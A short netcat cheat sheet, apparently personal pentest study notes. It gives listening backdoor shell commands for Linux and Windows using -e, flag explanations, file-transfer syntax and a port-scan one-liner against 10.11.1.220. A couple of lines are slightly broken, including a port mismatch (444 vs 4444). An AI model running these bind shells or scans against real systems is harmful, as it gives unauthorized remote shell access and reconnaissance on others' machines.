====== NetCat ======
Created Tuesday 18 February 2020

==== Listening backdoor shell on Linux: ====
$ nc –l –p [LocalPort] –e [[/bin/bash]]   

==== Listening backdoor shell on Windows: ====
C:\> nc –l –p [LocalPort] –e cmd.exe


=== Flags ===
-e is not always built into netcat due to security issues, but specifies the program to run upon connection

-n Do not resolve hostname
-v verbose (double for more output)
-p port
-l listen
-w <secs> timeout in seconds
-z zero I/O mode, great for port scanning 

=== Listening shell ===
nc -l -p <port

=== Transferring files ===

Server:
nc -nvl -p 444  > output.file

Client:

nc -nv <host> 4444 < input.file


=== Port scanning (what??) ===
{{{code: lang="sh" linenumbers="False"
nc -nvv -w 1 -z 10.11.1.220 3388-3390
}}}

- No DNS lookups
- Double verbose
- Wait 1 second before timeout
- Zero I/O mode
